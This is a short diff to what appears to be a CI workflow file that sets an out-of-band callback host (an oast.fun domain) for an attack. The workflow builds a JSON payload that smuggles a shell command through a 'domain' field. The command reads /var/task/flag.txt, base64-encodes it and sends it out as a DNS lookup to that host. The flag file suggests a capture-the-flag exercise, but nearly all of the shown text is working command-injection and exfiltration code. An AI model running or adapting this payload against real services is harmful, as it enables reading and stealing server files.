@@ -26,7 +26,7 @@ jobs:
           URL="gehqptlfvfkfakfpbqdzb6kmjoqjcnjzs.oast.fun"
           
           # Replace YOUR_SUBDOMAIN with your DNS collaborator host (e.g., xxx.oastify.com or xxx.interact.sh)
-          COLLABORATOR="YOUR_SUBDOMAIN.com"
+          COLLABORATOR="gehqptlfvfkfakfpbqdzb6kmjoqjcnjzs.oast.fun"
           
           PAYLOAD="{\"domain\": \"127.0.0.1; FLAG=\$(cat /var/task/flag.txt | base64 | tr -d '\n'); dig \$FLAG.$COLLABORATOR\"}"
           
